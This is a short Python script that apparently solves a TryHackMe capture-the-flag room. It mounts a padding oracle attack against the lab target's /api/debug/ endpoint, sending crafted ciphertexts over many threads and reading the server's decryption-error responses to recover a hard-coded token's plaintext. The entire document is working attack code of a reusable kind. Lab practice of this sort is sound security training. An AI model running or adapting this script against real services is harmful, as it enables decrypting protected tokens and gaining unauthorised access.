# scsript updated  by ChatGPT
#Orignial script: https://github.com/djosix/padding_oracle.py
# sript work for tryhackme rootm New York Flankees https://tryhackme.com/r/room/thenewyorkflankees
# script did not work on Attackbox, I used my computer, it take about 5 munites to find solution.
# fast script: https://github.com/glebarez/padre

from padding_oracle import decrypt
import requests
from tqdm import tqdm
import time

sess = requests.Session()  # Uses connection pooling
url = 'http://10.10.209.195:8080/api/debug/'

def oracle(ciphertext: bytes):
    ciphertext_hex = ciphertext.hex()
    full_url = f"{url}{ciphertext_hex}"
    response = sess.get(full_url)
    if 'Decryption error' in response.text:
        return False  # Token decryption failed
    elif 'Custom authentication success' in response.text:
        return True
    else:
        raise RuntimeError('Unexpected response')

ciphertext_hex = '39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4'
ciphertext = bytes.fromhex(ciphertext_hex)

assert len(ciphertext) % 16 == 0

def decrypt_with_progress(ciphertext, block_size, oracle, num_threads):
    total_blocks = len(ciphertext) // block_size
    
    def progress_oracle(ct):
        result = oracle(ct)
        progress_bar.update(1)
        return result

    with tqdm(total=total_blocks * 256, desc="Decrypting", unit="attempt") as progress_bar:
        return decrypt(
            ciphertext,
            block_size=block_size,
            oracle=progress_oracle,
            num_threads=num_threads,
        )

try:
    plaintext = decrypt_with_progress(
        ciphertext,
        block_size=16,
        oracle=oracle,
        num_threads=16,
    )
    print(f"Plaintext: {plaintext}")
except Exception as e:
    print(f"Error during decryption: {e}")
